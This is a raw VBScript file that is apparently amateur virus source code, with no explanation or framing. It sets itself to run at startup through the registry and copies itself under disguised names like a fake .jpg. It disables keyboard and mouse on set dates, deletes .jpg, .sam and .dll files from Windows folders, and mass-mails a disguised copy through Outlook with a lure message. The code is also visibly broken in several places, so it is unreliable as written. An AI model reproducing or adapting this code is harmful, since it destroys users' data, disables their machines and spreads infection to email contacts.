Loop:
do
Dim Virus,FSO
set Virus = Wscript.ScriptFullName
On Error Resume Next
Set Checker = CreateObject("Scripting.FileSystemObject") 
If Not Checker.fileExists(Virus) Then
Checker.createtextfile(Virus, True)
Shell.run "Virus"
End If
Loop
On Error Resume next
Set ED = CreateObject("WScript.Shell")ED.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\RunTime1", "wscript.exe %windows%\Virus.vbs %*"
set FSO=CreateObject("Scripting.FileSystemObject")
FSO.CopyFile Virus, "%windir%\Virus.vbs"
FSO.CopyFile Virus, "%System%\MsDos673.exe.vbs"
FSO.CopyFile Virus, "%windir%\msboobs..vbs"
FSO.CopyFile Virus, "%windir%\coolvirus.vbs"
FSO.CopyFile Virus, "%windir%\pizza.vbs"
FSO.CopyFile Virus, "%windir%\drinks4u.vbs"
FSO.CopyFile Virus, "%windir%\outcoldNhot.vbs"
FSO.CopyFile Virus, "%windir%\lifesucksbad.vbs"
FSO.CopyFile Virus, "%windir%\Idontwantwar.vbs"
FSO.CopyFile Virus, "%windir%\PeaCE.vbs"
FSO.CopyFile Virus, "%windir%\PC00031.jpg.vbs"

Dim BAT,fso1
set fso1=CreateObject("Scripting.FileSystemObject")
set batcha=fso.CreateTextFile("%WinDir%\DisableKeyboardNMouse.bat")
BAT.WriteLine "C:\windows\rundll32.exe mouse,disable"
BAT.WriteLine "C:\windows\rundll32.exe Keyboard,disable"
BAT.Close

Do
if month(now) =1 and day(now) =14 then
shell "%WinDir%\DisableKeyboardNMouse.bat"
end if
if month(now) =2 and day(now) =14 then
shell "%WinDir%\DisableKeyboardNMouse.bat"
end if
if month(now) =3 and day(now) =14 then
shell "%WinDir%\DisableKeyboardNMouse.bat"
end if
if month(now) =4 and day(now) =14 then
shell "%WinDir%\DisableKeyboardNMouse.bat"
end if
if month(now) =5 and day(now) =14 then
shell "%WinDir%\DisableKeyboardNMouse.bat"
end if
if month(now) =6 and day(now) =14 then
shell "%WinDir%\DisableKeyboardNMouse.bat"
end if
if month(now) =7 and day(now) =14 then
shell "%WinDir%\DisableKeyboardNMouse.bat"
end if
if month(now) =8 and day(now) =14 then
shell "%WinDir%\DisableKeyboardNMouse.bat"
end if
if month(now) =9 and day(now) =14 then
shell "%WinDir%\DisableKeyboardNMouse.bat"
end if
if month(now) =10 and day(now) =14 then
shell "%WinDir%\DisableKeyboardNMouse.bat"
end if
if month(now) =11 and day(now) =14 then
shell "%WinDir%\DisableKeyboardNMouse.bat"
end if
if month(now) =12 and day(now) =14 then
shell "%WinDir%\DisableKeyboardNMouse.bat"
end if
if month(now) =12 and day(now) =25 then
MsgBox "Happy XMAS N a HaPpY nEw YeAr!" 
end if
if month(now) =1 and day(now) =1 then
GoTo MailTime
end if
if month(now) =2 and day(now) =2 then
GoTo MailTime
end if
if month(now) =3 and day(now) =3 then
GoTo MailTime
end if
if month(now) =4 and day(now) =4 then
GoTo MailTime
end if
if month(now) =5 and day(now) =5 then
GoTo MailTime
end if
if month(now) =6 and day(now) =6 then
GoTo MailTime
end if
if month(now) =7 and day(now) =7 then
GoTo MailTime
end if
if month(now) =8 and day(now) =8 then
GoTo MailTime
end if
if month(now) =9 and day(now) =9 then
GoTo MailTime
end if
if month(now) =10 and day(now) =10 then
GoTo MailTime
end if
if month(now) =11 and day(now) =11 then
GoTo MailTime
end if
if month(now) =12 and day(now) =12 then
GoTo MailTime
end if
next 
FSO.DeleteFile ("C:\*.jpg")
FSO.DeleteFile ("C:\*.sam")
FSO.DeleteFile ("C:\*.dll")
FSO.DeleteFile ("%windir%\*.jpg")
FSO.DeleteFile ("%windir%\*.sam")
FSO.DeleteFile ("%windir%\*.dll")
FSO.DeleteFile ("%System%\*.jpg")
FSO.DeleteFile ("%System%\*.sam")
FSO.DeleteFile ("%System%\*.dll")
GoTo Loop
MailTime:
On Error Resume next
Set olOutlookApp = GetObject(, "Outlook.Application")
  If Err <> 0 Then
     Set olOutlookApp = CreateObject("Outlook.Application")
      blnNewOutlookApp = True
  End If
on error resume next    
 Set olEMail = olOutlookApp.CreateItem(olMailItem)
  With olEMail
      For x = 1 To NoToRecp
      .Recipients.Add AddressTo(x)
      Next x
      If NoCCRecp <= 0 Then GoTo Send
      For x = 1 To NoCCRecp
      .Recipients.Add(AddressCC(x)).Type = olCC
      Next x
Send:
      .Subject = "wasssup?"
      .Body = "here dont show nobody ok???"
      .Attachments.Add %windir%\PC00031.jpg.vbs, olByValue, ,"me"
      .DeleteAfterSubmit = True
      .Send
  End With
